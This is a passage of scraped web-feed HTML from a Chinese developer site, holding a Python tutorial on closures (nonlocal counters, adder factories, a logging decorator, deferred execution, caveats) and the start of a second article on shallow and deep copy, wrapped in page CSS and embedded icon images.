ABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAEKgAwAEAAAAAQAAAEIAAAAAgodoEQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAABMtJREFUeAHtXM2KFDEQzrQKruIu4mEXRFlUVLz4A4K7B99AcO8io0/gwQfxDVzFuwu+gQf34EG8iOAPKAh6EFlBFMSf/qa2uqszlVR6ZtYxM5PDJNVVSer78nU6KrHzpyxuVlwx44AY2O0T8eb9D7f5fMu9fPvdff7y0/36nbdgdhUdd+jgHnf62JxbObvgjh/d60Pu2R35ajx49Mk9frqlBk7Kw8sXF9y1K4t9cCoi7tz/4F68/tYXMIkPzpzY725dP9yA1tsjoIRpIQHogRWYZSmwJ4Reh06nI2Nd7rYEA8zAzqXAxhgq/pc1d9vHKbEX+Dr4JbzypJDc/YxXYi/wifRLeOXpU5q7n/FK7EXsnBBeeRoqd7/EHj1ZhleeiMjdz8pArRKR+0pb+UsCuK0SkftKW/kzeFmrRHCAxWzufsaJOkqExWzufpOI8EpP1jnCJCK80pN1jjCJ4ICwMigidz/jRD3bI7bZUInIfaWt/KUSuK0SEd4jqFvufgYva5UIDrCYzd3POFFHifhfV/7k8lwPw7D5mUSEV3r854ju2pK7ffOIWzk/X+Go803Lr+ooGqoiwkyP9xzRXVt0q9sE3CgJYTLqfNPyE/irpkoEe2um6ck4bSiBSeD8JBl41jY/Hgd1lIiaaeoyLlsjgUGAjEH3DB4DtUpEW2Z3Mj5GAgA8efbVvXpX/200nln5IMYvKhHDrvylcwdc9+pSNdeg46WQsP7wo2s7fpWYaPT926fw9ZiVk4BpywYJkGuvlJs4EuWS0p/HTyHh3kbzH2najM85cR0lgpPiYMtukFB26m1u5Ua+vkFkWP3Zn0KCJDg1Px6f42Wtvhrhdyz8ncanrFKCmGH1wrwDMCrh/uxPIUFTAvdHbeVPsc1fVRE+c7Ud/k6fWt7XHFlYqcqQ5wTRvWpiY4wrIZwfDUL+akDRUBXB/jCzFCH9SHCzTDRUmsro7z+cEvrHwxOZn2ZTL/pVFcEBtRLoiWXfxQ5ehvoHHx4vpIwUEuJKSMvPz5/zQq0qwmIy5m+rjBQSwnsCQYnlgwjfT72av6oifOba2qnKcOXeGVIP0rT3BALTNr8mBWSpRHAgmJSTtLGhDHwj+A9GPCbX2DNiBSRoShg0H8zl5y/njxIhJ0WntralDJmIbO+UEvz85Zwt9wj7HIDB5Ttp7RkyGbRDSqC49vOjX50P9aexmr+qInzmajvtO13H02SpyrCVMNj8dT7/4BwByDXzRIC0LWXEldA/njVfip9GpV9VERxQM0lPhrVDyrCVMJr5/fwZJ+qWewR1lSuNJ21sXxnjVgIhck5VhM/cqG1WBpIAMX4Z9Xz+eP58sFUiOBArLQcZpQ0CNCXt1HzA5OfPOFGrrwYHyKTwbNJsxolaJUJbKeo0mu/4uMeXBHBbJSK88qP5jo97fAYva5UIDgivHEXk7mecqKNEhFeOhsjdbxKR+0pb+UsCuK0qIveVtvJn8LJWieAAi9nc/YwTdZQIi9nc/SYR4ZWenSO2yZvgcwTuRYZKWBnUI3e/xF7gcmio5L4HWPlL7AVuyPol95W28me8EnuBa8J+sZjM3c94JfYCd6VxTXjaCjDLe+K9cwTuSuOa8LQUYPXvh1d3w0HC7JK8kMK0/rcJfwHkVMYgi4xhOgAAAABJRU5ErkJggg==");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>引言：
闭包是 Python 函数式编程中极具特色的进阶特性，它既不是基础语法，也不是必备工具，却能在特定场景下实现优雅的状态封装 —— 无需类的复杂结构，仅通过函数就能保留变量的上下文状态。本文聚焦<strong>闭包</strong>这一核心知识点，从核心概念、实现条件到实战场景，带你彻底掌握这一 Python 进阶技能。</p>
<h2 data-id="heading-0">一、闭包的核心概念</h2>
<h3 data-id="heading-1">1. 闭包的定义</h3>
<p>闭包（Closure）本质是<strong>嵌套函数</strong>的一种特殊形式：内层函数引用了外层函数的变量（非全局变量），且外层函数返回内层函数本身。简单来说，闭包满足三个核心条件：</p>
<ol>
<li>存在嵌套函数（外层函数 + 内层函数）；</li>
<li>内层函数引用了外层函数的变量（自由变量）；</li>
<li>外层函数返回内层函数（而非内层函数的执行结果）。</li>
</ol>
<p>闭包的核心价值是：<strong>保留外层函数的变量状态</strong>—— 即使外层函数执行完毕，其变量也不会被垃圾回收，而是被内层函数 “记住” 并持续使用。</p>
<h3 data-id="heading-2">2. 通俗理解</h3>
<p>可以把闭包比作 “带记忆的函数”：外层函数是 “记忆生成器”，定义了要记住的变量；内层函数是 “执行器”，既能执行逻辑，又能访问这些 “记忆”；返回内层函数则是把 “带记忆的执行器” 拿出来单独使用。</p>
<h2 data-id="heading-3">二、闭包的基础实现</h2>
<h3 data-id="heading-4">1. 最简闭包示例</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 外层函数：定义要封装的状态（变量）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">outer_func</span>(<span class="hljs-params">msg</span>):
    <span class="hljs-comment"># 自由变量：被内层函数引用的外层变量</span>
    message = msg

    <span class="hljs-comment"># 内层函数：使用外层变量，无独立的同名变量</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner_func</span>():
        <span class="hljs-comment"># 引用外层函数的message变量</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"闭包记住的信息：<span class="hljs-subst">{message}</span>"</span>)
    
    <span class="hljs-comment"># 外层函数返回内层函数（不执行，仅返回函数对象）</span>
    <span class="hljs-keyword">return</span> inner_func

<span class="hljs-comment"># 调用外层函数，得到内层函数对象（此时outer_func已执行完毕）</span>
func = outer_func(<span class="hljs-string">"Hello, Closure!"</span>)
<span class="hljs-comment"># 调用内层函数，仍能访问外层的message变量</span>
func()  <span class="hljs-comment"># 输出：闭包记住的信息：Hello, Closure!</span>

<span class="hljs-comment"># 再次创建新的闭包实例，状态独立</span>
func2 = outer_func(<span class="hljs-string">"Python is awesome!"</span>)
func2()  <span class="hljs-comment"># 输出：闭包记住的信息：Python is awesome!</span>
func()   <span class="hljs-comment"># 输出：闭包记住的信息：Hello, Closure!（原有状态不受影响）</span>
</code></pre>
<h3 data-id="heading-5">2. 闭包的关键验证</h3>
<p>通过 <code>__closure__</code> 属性可验证是否为闭包：闭包函数的 <code>__closure__</code> 会返回包含自由变量的元组，普通函数则返回 <code>None</code>。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 验证闭包属性</span>
<span class="hljs-built_in">print</span>(func.__closure__)  <span class="hljs-comment"># 输出：(&lt;cell at 0x...: str object at 0x...&gt;,)</span>
<span class="hljs-built_in">print</span>(func.__closure__[<span class="hljs-number">0</span>].cell_contents)  <span class="hljs-comment"># 输出：Hello, Closure!</span>

<span class="hljs-comment"># 普通函数（无闭包）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">normal_func</span>():
    a = <span class="hljs-number">1</span>
    <span class="hljs-built_in">print</span>(a)

normal = normal_func
<span class="hljs-built_in">print</span>(normal.__closure__)  <span class="hljs-comment"># 输出：None</span>
</code></pre>
<h2 data-id="heading-6">三、闭包的进阶用法</h2>
<h3 data-id="heading-7">1. 带参数的闭包</h3>
<p>内层函数可接收参数，结合外层变量实现更灵活的逻辑：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 需求：创建加法器，固定一个加数，动态传入另一个加数</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">make_adder</span>(<span class="hljs-params">fixed_num</span>):
    <span class="hljs-comment"># 外层变量：固定的加数</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">adder</span>(<span class="hljs-params">dynamic_num</span>):
        <span class="hljs-comment"># 内层函数接收动态参数，结合外层变量计算</span>
        <span class="hljs-keyword">return</span> fixed_num + dynamic_num
    <span class="hljs-keyword">return</span> adder

<span class="hljs-comment"># 创建加5的加法器</span>
add5 = make_adder(<span class="hljs-number">5</span>)
<span class="hljs-built_in">print</span>(add5(<span class="hljs-number">3</span>))  <span class="hljs-comment"># 输出：8（5+3）</span>
<span class="hljs-built_in">print</span>(add5(<span class="hljs-number">10</span>)) <span class="hljs-comment"># 输出：15（5+10）</span>

<span class="hljs-comment"># 创建加100的加法器</span>
add100 = make_adder(<span class="hljs-number">100</span>)
<span class="hljs-built_in">print</span>(add100(<span class="hljs-number">20</span>))  <span class="hljs-comment"># 输出：120</span>
</code></pre>
<h3 data-id="heading-8">2. 闭包实现状态累加</h3>
<p>闭包可保留变量的更新状态，替代简单的类实现：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 需求：实现计数器，每次调用自增1</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">counter</span>():
    <span class="hljs-comment"># 私有状态：仅闭包可访问，外部无法直接修改</span>
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">increment</span>():
        <span class="hljs-comment"># 声明修改外层变量（nonlocal关键字）</span>
        <span class="hljs-keyword">nonlocal</span> count
        count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> count
    <span class="hljs-keyword">return</span> increment

<span class="hljs-comment"># 创建计数器实例</span>
cnt = counter()
<span class="hljs-built_in">print</span>(cnt())  <span class="hljs-comment"># 输出：1</span>
<span class="hljs-built_in">print</span>(cnt())  <span class="hljs-comment"># 输出：2</span>
<span class="hljs-built_in">print</span>(cnt())  <span class="hljs-comment"># 输出：3</span>

<span class="hljs-comment"># 新计数器实例，状态独立</span>
cnt2 = counter()
<span class="hljs-built_in">print</span>(cnt2())  <span class="hljs-comment"># 输出：1</span>
<span class="hljs-built_in">print</span>(cnt())   <span class="hljs-comment"># 输出：4（原有计数器不受影响）</span>
</code></pre>
<p><strong>关键说明</strong>：<code>nonlocal</code> 关键字用于声明内层函数要修改的是外层函数的变量（而非创建局部变量），若无此声明，直接修改 <code>count</code> 会报 <code>UnboundLocalError</code>。</p>
<h2 data-id="heading-9">四、闭包的典型应用场景</h2>
<h3 data-id="heading-10">1. 简化简单状态管理</h3>
<p>无需定义类，即可实现轻量级的状态封装，比类更简洁：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 对比：闭包 vs 类实现计数器</span>
<span class="hljs-comment"># 闭包实现（简洁）</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">closure_counter</span>():
    count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inc</span>():
        <span class="hljs-keyword">nonlocal</span> count
        count +=<span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> count
    <span class="hljs-keyword">return</span> inc

<span class="hljs-comment"># 类实现（繁琐）</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">ClassCounter</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.count = <span class="hljs-number">0</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inc</span>(<span class="hljs-params">self</span>):
        self.count +=<span class="hljs-number">1</span>
        <span class="hljs-keyword">return</span> self.count

<span class="hljs-comment"># 使用效果一致，但闭包代码量更少</span>
cc = ClassCounter()
<span class="hljs-built_in">print</span>(cc.inc())  <span class="hljs-comment"># 1</span>
clc = closure_counter()
<span class="hljs-built_in">print</span>(clc())     <span class="hljs-comment"># 1</span>
</code></pre>
<h3 data-id="heading-11">2. 装饰器的底层支撑</h3>
<p>Python 装饰器的核心实现依赖闭包 —— 装饰器函数接收被装饰函数作为外层变量，内层函数包装逻辑并返回，本质就是闭包的应用：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 基于闭包实现日志装饰器</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">log_decorator</span>(<span class="hljs-params">func</span>):
    <span class="hljs-comment"># 外层变量：被装饰的函数</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwargs</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"执行函数：<span class="hljs-subst">{func.__name__}</span>"</span>)
        result = func(*args, **kwargs)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"函数执行完成，结果：<span class="hljs-subst">{result}</span>"</span>)
        <span class="hljs-keyword">return</span> result
    <span class="hljs-comment"># 返回内层函数（闭包）</span>
    <span class="hljs-keyword">return</span> wrapper

<span class="hljs-meta">@log_decorator</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>):
    <span class="hljs-keyword">return</span> a + b

add(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
<span class="hljs-comment"># 输出：</span>
<span class="hljs-comment"># 执行函数：add</span>
<span class="hljs-comment"># 函数执行完成，结果：5</span>
</code></pre>
<h3 data-id="heading-12">3. 延迟执行逻辑</h3>
<p>闭包可将参数和逻辑封装，延迟到需要时执行：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 需求：批量创建计算任务，按需执行</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">create_calc_task</span>(<span class="hljs-params">operator, num1</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">calc</span>(<span class="hljs-params">num2</span>):
        <span class="hljs-keyword">if</span> operator == <span class="hljs-string">"+"</span>:
            <span class="hljs-keyword">return</span> num1 + num2
        <span class="hljs-keyword">elif</span> operator == <span class="hljs-string">"*"</span>:
            <span class="hljs-keyword">return</span> num1 * num2
    <span class="hljs-keyword">return</span> calc

<span class="hljs-comment"># 创建两个计算任务</span>
add_task = create_calc_task(<span class="hljs-string">"+"</span>, <span class="hljs-number">10</span>)
mul_task = create_calc_task(<span class="hljs-string">"*"</span>, <span class="hljs-number">10</span>)

<span class="hljs-comment"># 延迟执行（后续任意时机调用）</span>
<span class="hljs-built_in">print</span>(add_task(<span class="hljs-number">5</span>))  <span class="hljs-comment"># 15</span>
<span class="hljs-built_in">print</span>(mul_task(<span class="hljs-number">5</span>))  <span class="hljs-comment"># 50</span>
</code></pre>
<h2 data-id="heading-13">五、闭包的注意事项</h2>
<ol>
<li>
<p><strong>自由变量的修改</strong>：内层函数修改外层变量时，必须用 <code>nonlocal</code> 声明（全局变量用 <code>global</code>），否则会视为创建局部变量；</p>
</li>
<li>
<p><strong>内存占用</strong>：闭包会保留外层变量的引用，若大量创建闭包实例且长期不释放，可能导致内存泄漏，需及时清理；</p>
</li>
<li>
<p><strong>可读性权衡</strong>：简单逻辑用闭包更简洁，复杂状态管理建议用类（更易维护）；</p>
</li>
<li>
<p><strong>变量作用域</strong>：闭包引用的是变量的引用，而非变量的快照 —— 若外层变量后续被修改，闭包获取的是最新值：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">outer</span>():
    x = <span class="hljs-number">1</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">inner</span>():
        <span class="hljs-built_in">print</span>(x)
    x = <span class="hljs-number">2</span>  <span class="hljs-comment"># 外层变量被修改</span>
    <span class="hljs-keyword">return</span> inner

f = outer()
f()  <span class="hljs-comment"># 输出：2（而非1）</span>
</code></pre>
</li>
</ol>
<h2 data-id="heading-14">总结</h2>
<ol>
<li>闭包是满足 “嵌套函数 + 引用外层变量 + 返回内层函数” 三个条件的特殊函数，核心能力是<strong>封装并保留外层函数的变量状态</strong>；</li>
<li><code>nonlocal</code> 关键字是修改外层函数变量的关键，<code>__closure__</code> 属性可验证是否为闭包；</li>
<li>闭包适用于轻量级状态管理、装饰器实现、延迟执行等场景，是函数式编程的重要工具，但其可读性需与复杂度权衡</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 Python 中的深浅拷贝（Shallow Copy & Deep Copy）：避免数据引用的 “坑”]]></title>    <link>https://juejin.cn/post/7589932422654214180</link>    <guid>https://juejin.cn/post/7589932422654214180</guid>    <pubDate>2026-01-02T07:59:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654214180" data-draft-id="7589655730293014568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 Python 中的深浅拷贝（Shallow Copy &amp; Deep Copy）：避免数据引用的 “坑”"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-01-02T07:59:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吃西红柿长大的番茄"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 Python 中的深浅拷贝（Shallow Copy &amp; Deep Copy）：避免数据引用的 “坑”
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吃西红柿长大的番茄
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T07:59:59.000Z" title="Fri Jan 02 2026 07:59:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body 